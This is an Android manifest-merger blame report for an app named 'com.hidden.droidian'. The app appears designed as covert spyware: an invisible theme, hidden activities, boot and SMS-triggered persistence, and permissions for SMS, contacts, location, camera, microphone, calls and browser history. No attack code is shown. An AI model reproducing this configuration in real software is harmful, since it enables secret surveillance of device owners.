build/intermediates/manifest_merge_blame_file/release/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.hidden.droidian"
4    android:versionCode="2"
5    android:versionName="2.0" >
6
7    <uses-sdk android:minSdkVersion="16" />
7-->src/main/AndroidManifest.xml
8
9    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
9-->src/main/AndroidManifest.xml:7:5-81
9-->src/main/AndroidManifest.xml:7:22-78
10    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
10-->src/main/AndroidManifest.xml:8:5-77
10-->src/main/AndroidManifest.xml:8:22-74
11    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
11-->src/main/AndroidManifest.xml:9:5-78
11-->src/main/AndroidManifest.xml:9:22-75
12    <uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE" />
12-->src/main/AndroidManifest.xml:10:5-75
12-->src/main/AndroidManifest.xml:10:22-72
13    <uses-permission android:name="com.huawei.permission.external_app_settings.USE_COMPONENT" />
13-->src/main/AndroidManifest.xml:11:5-97
13-->src/main/AndroidManifest.xml:11:22-94
14    <uses-permission android:name="android.permission.BATTERY_STATS" />
14-->src/main/AndroidManifest.xml:12:5-14:47
14-->src/main/AndroidManifest.xml:13:9-56
15
16    <supports-screens
16-->src/main/AndroidManifest.xml:17:5-20:40
17        android:largeScreens="true"
17-->src/main/AndroidManifest.xml:18:9-36
18        android:resizeable="true"
18-->src/main/AndroidManifest.xml:19:9-34
19        android:xlargeScreens="true" />
19-->src/main/AndroidManifest.xml:20:9-37
20
21    <uses-permission
21-->src/main/AndroidManifest.xml:82:5-84:35
22        android:name="android.permission.QUICKBOOT_POWERON"
22-->src/main/AndroidManifest.xml:83:9-60
23        android:required="true" />
23-->src/main/AndroidManifest.xml:84:9-32
24    <uses-permission
24-->src/main/AndroidManifest.xml:85:5-87:35
25        android:name="android.permission.INTERNET"
25-->src/main/AndroidManifest.xml:86:9-51
26        android:required="true" />
26-->src/main/AndroidManifest.xml:87:9-32
27    <uses-permission
27-->src/main/AndroidManifest.xml:88:5-90:35
28        android:name="android.permission.READ_SMS"
28-->src/main/AndroidManifest.xml:89:9-51
29        android:required="true" />
29-->src/main/AndroidManifest.xml:90:9-32
30    <uses-permission
30-->src/main/AndroidManifest.xml:91:5-93:35
31        android:name="android.permission.WRITE_SMS"
31-->src/main/AndroidManifest.xml:92:9-52
32        android:required="true" />
32-->src/main/AndroidManifest.xml:93:9-32
33    <uses-permission
33-->src/main/AndroidManifest.xml:94:5-97:47
34        android:name="android.permission.GET_ACCOUNTS"
34-->src/main/AndroidManifest.xml:95:9-55
35        android:required="true" />
35-->src/main/AndroidManifest.xml:96:9-32
36    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
36-->src/main/AndroidManifest.xml:98:5-93
36-->src/main/AndroidManifest.xml:98:22-90
37    <uses-permission
37-->src/main/AndroidManifest.xml:99:5-101:35
38        android:name="android.permission.ACCESS_NETWORK_STATE"
38-->src/main/AndroidManifest.xml:100:9-63
39        android:required="true" />
39-->src/main/AndroidManifest.xml:101:9-32
40    <uses-permission
40-->src/main/AndroidManifest.xml:102:5-104:35
41        android:name="android.permission.READ_CONTACTS"
41-->src/main/AndroidManifest.xml:103:9-56
42        android:required="true" />
42-->src/main/AndroidManifest.xml:104:9-32
43    <uses-permission
43-->src/main/AndroidManifest.xml:105:5-107:35
44        android:name="android.permission.ACCESS_FINE_LOCATION"
44-->src/main/AndroidManifest.xml:106:9-63
45        android:required="true" />
45-->src/main/AndroidManifest.xml:107:9-32
46    <uses-permission
46-->src/main/AndroidManifest.xml:108:5-110:35
47        android:name="android.permission.GET_TASKS"
47-->src/main/AndroidManifest.xml:109:9-52
48        android:required="true" />
48-->src/main/AndroidManifest.xml:110:9-32
49    <uses-permission
49-->src/main/AndroidManifest.xml:111:5-113:35
50        android:name="android.permission.WAKE_LOCK"
50-->src/main/AndroidManifest.xml:112:9-52
51        android:required="true" />
51-->src/main/AndroidManifest.xml:113:9-32
52    <uses-permission
52-->src/main/AndroidManifest.xml:114:5-116:35
53        android:name="android.permission.CALL_PHONE"
53-->src/main/AndroidManifest.xml:115:9-53
54        android:required="true" />
54-->src/main/AndroidManifest.xml:116:9-32
55    <uses-permission
55-->src/main/AndroidManifest.xml:117:5-119:35
56        android:name="android.permission.SEND_SMS"
56-->src/main/AndroidManifest.xml:118:9-51
57        android:required="true" />
57-->src/main/AndroidManifest.xml:119:9-32
58    <uses-permission
58-->src/main/AndroidManifest.xml:120:5-122:36
59        android:name="android.permission.READ_PHONE_STATE"
59-->src/main/AndroidManifest.xml:121:9-59
60        android:required="false" />
60-->src/main/AndroidManifest.xml:122:9-33
61    <uses-permission
61-->src/main/AndroidManifest.xml:123:5-125:35
62        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
62-->src/main/AndroidManifest.xml:124:9-65
63        android:required="true" />
63-->src/main/AndroidManifest.xml:125:9-32
64    <uses-permission
64-->src/main/AndroidManifest.xml:126:5-128:35
65        android:name="android.permission.CAMERA"
65-->src/main/AndroidManifest.xml:127:9-49
66        android:required="true" />
66-->src/main/AndroidManifest.xml:128:9-32
67    <uses-permission
67-->src/main/AndroidManifest.xml:129:5-131:35
68        android:name="android.permission.RECORD_AUDIO"
68-->src/main/AndroidManifest.xml:130:9-55
69        android:required="true" />
69-->src/main/AndroidManifest.xml:131:9-32
70    <uses-permission
70-->src/main/AndroidManifest.xml:132:5-134:35
71        android:name="android.permission.PROCESS_OUTGOING_CALLS"
71-->src/main/AndroidManifest.xml:133:9-65
72        android:required="true" />
72-->src/main/AndroidManifest.xml:134:9-32
73    <uses-permission
73-->src/main/AndroidManifest.xml:135:5-137:35
74        android:name="android.permission.RECEIVE_SMS"
74-->src/main/AndroidManifest.xml:136:9-54
75        android:required="true" />
75-->src/main/AndroidManifest.xml:137:9-32
76
77    <uses-feature
77-->src/main/AndroidManifest.xml:139:5-141:36
78        android:name="android.hardware.camera"
78-->src/main/AndroidManifest.xml:140:9-47
79        android:required="false" />
79-->src/main/AndroidManifest.xml:141:9-33
80    <uses-feature
80-->src/main/AndroidManifest.xml:142:5-144:36
81        android:name="android.hardware.camera.front"
81-->src/main/AndroidManifest.xml:143:9-53
82        android:required="false" />
82-->src/main/AndroidManifest.xml:144:9-33
83    <uses-feature
83-->src/main/AndroidManifest.xml:145:5-147:36
84        android:name="android.hardware.camera.autofocus"
84-->src/main/AndroidManifest.xml:146:9-57
85        android:required="false" />
85-->src/main/AndroidManifest.xml:147:9-33
86    <uses-feature
86-->src/main/AndroidManifest.xml:148:5-151:47
87        android:name="android.hardware.microphone"
87-->src/main/AndroidManifest.xml:149:9-51
88        android:required="false" />
88-->src/main/AndroidManifest.xml:150:9-33
89
90    <application
90-->src/main/AndroidManifest.xml:22:5-80:19
91        android:allowBackup="false"
91-->src/main/AndroidManifest.xml:23:9-36
92        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
92-->[androidx.core:core:1.0.0] AndroidManifest.xml:22:18-86
93        android:icon="@drawable/launcher"
93-->src/main/AndroidManifest.xml:24:9-42
94        android:label="@string/app_name"
94-->src/main/AndroidManifest.xml:25:9-41
95        android:persistent="true"
95-->src/main/AndroidManifest.xml:26:9-34
96        android:requestLegacyExternalStorage="true"
96-->src/main/AndroidManifest.xml:27:9-52
97        android:theme="@style/Invisible"
97-->src/main/AndroidManifest.xml:28:9-41
98        android:usesCleartextTraffic="true" >
98-->src/main/AndroidManifest.xml:29:9-44
99        <activity
99-->src/main/AndroidManifest.xml:30:9-38:20
100            android:name="com.connect.Droidian"
100-->src/main/AndroidManifest.xml:31:13-48
101            android:enabled="true"
101-->src/main/AndroidManifest.xml:32:13-35
102            android:excludeFromRecents="true" >
102-->src/main/AndroidManifest.xml:33:13-46
103            <intent-filter>
103-->src/main/AndroidManifest.xml:34:13-37:29
104                <action android:name="android.intent.action.MAIN" />
104-->src/main/AndroidManifest.xml:35:17-69
104-->src/main/AndroidManifest.xml:35:25-66
105
106                <category android:name="android.intent.category.LAUNCHER" />
106-->src/main/AndroidManifest.xml:36:17-77
106-->src/main/AndroidManifest.xml:36:27-74
107            </intent-filter>
108        </activity>
109        <activity
109-->src/main/AndroidManifest.xml:39:9-42:58
110            android:name="com.connect.Dialog"
110-->src/main/AndroidManifest.xml:40:13-46
111            android:enabled="true"
111-->src/main/AndroidManifest.xml:41:13-35
112            android:excludeFromRecents="true" />
112-->src/main/AndroidManifest.xml:42:13-46
113        <activity
113-->src/main/AndroidManifest.xml:43:9-46:58
114            android:name="com.connect.CameraView"
114-->src/main/AndroidManifest.xml:44:13-50
115            android:enabled="true"
115-->src/main/AndroidManifest.xml:45:13-35
116            android:excludeFromRecents="true" />
116-->src/main/AndroidManifest.xml:46:13-46
117        <activity
117-->src/main/AndroidManifest.xml:47:9-50:58
118            android:name="com.connect.VideoView"
118-->src/main/AndroidManifest.xml:48:13-49
119            android:enabled="true"
119-->src/main/AndroidManifest.xml:49:13-35
120            android:excludeFromRecents="true" />
120-->src/main/AndroidManifest.xml:50:13-46
121
122        <service
122-->src/main/AndroidManifest.xml:52:9-57:49
123            android:name="com.connect.DroidianService"
123-->src/main/AndroidManifest.xml:53:13-55
124            android:enabled="true"
124-->src/main/AndroidManifest.xml:54:13-35
125            android:exported="true"
125-->src/main/AndroidManifest.xml:55:13-36
126            android:permission="android.permission.BIND_JOB_SERVICE"
126-->src/main/AndroidManifest.xml:56:13-69
127            android:persistent="true" />
127-->src/main/AndroidManifest.xml:57:13-38
128        <service android:name="com.connect.RecordService" />
128-->src/main/AndroidManifest.xml:58:9-69
128-->src/main/AndroidManifest.xml:58:18-58
129
130        <receiver
130-->src/main/AndroidManifest.xml:60:9-79:20
131            android:name="com.connect.ServiceReceiver"
131-->src/main/AndroidManifest.xml:61:13-55
132            android:enabled="true"
132-->src/main/AndroidManifest.xml:62:13-35
133            android:exported="true"
133-->src/main/AndroidManifest.xml:63:13-36
134            android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
134-->src/main/AndroidManifest.xml:64:13-75
135            <intent-filter>
135-->src/main/AndroidManifest.xml:65:13-78:29
136                <action android:name="android.intent.action.BOOT_COMPLETED" />
136-->src/main/AndroidManifest.xml:66:17-79
136-->src/main/AndroidManifest.xml:66:25-76
137                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
137-->src/main/AndroidManifest.xml:67:17-82
137-->src/main/AndroidManifest.xml:67:25-79
138                <action android:name="android.intent.action.PHONE_STATE" />
138-->src/main/AndroidManifest.xml:68:17-76
138-->src/main/AndroidManifest.xml:68:25-73
139                <action android:name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE" />
139-->src/main/AndroidManifest.xml:69:17-103
139-->src/main/AndroidManifest.xml:69:25-100
140                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
140-->src/main/AndroidManifest.xml:70:17-82
140-->src/main/AndroidManifest.xml:70:25-79
141
142                <category android:name="android.intent.category.DEFAULT" />
142-->src/main/AndroidManifest.xml:71:17-76
142-->src/main/AndroidManifest.xml:71:27-73
143
144                <action android:name="com.example.autostart.CATEGORY_AUTOSTART" />
144-->src/main/AndroidManifest.xml:72:17-83
144-->src/main/AndroidManifest.xml:72:25-80
145                <action android:name="com.example.autostart.ACTION_IMPLICIT_BROADCAST" />
145-->src/main/AndroidManifest.xml:73:17-90
145-->src/main/AndroidManifest.xml:73:25-87
146                <action android:name="com.example.autostart.ACTION_EXPLICIT_BROADCAST" />
146-->src/main/AndroidManifest.xml:74:17-90
146-->src/main/AndroidManifest.xml:74:25-87
147                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
147-->src/main/AndroidManifest.xml:75:17-86
147-->src/main/AndroidManifest.xml:75:25-83
148                <action android:name="android.intent.action.REBOOT" />
148-->src/main/AndroidManifest.xml:76:17-71
148-->src/main/AndroidManifest.xml:76:25-68
149                <action android:name="android.intent.action.USER_PRESENT" />
149-->src/main/AndroidManifest.xml:77:17-77
149-->src/main/AndroidManifest.xml:77:25-74
150            </intent-filter>
151        </receiver>
152    </application>
153
154</manifest>